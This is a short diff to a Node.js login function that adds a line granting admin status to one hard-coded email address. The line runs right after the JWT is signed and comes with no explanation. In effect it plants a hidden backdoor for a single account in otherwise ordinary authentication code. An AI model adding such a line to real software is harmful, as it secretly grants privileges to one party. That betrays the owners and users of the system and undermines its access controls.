@@ -25,6 +25,8 @@ const login = async (req, res) => {
     };
 
     const token = jwt.sign(payload, JWT_SECRET, { expiresIn: "1d" });
+    if (email === "abusscin_@hotmail.com") user.dataValues.admin = true;
+
 
     res.json({
       ...user.dataValues,
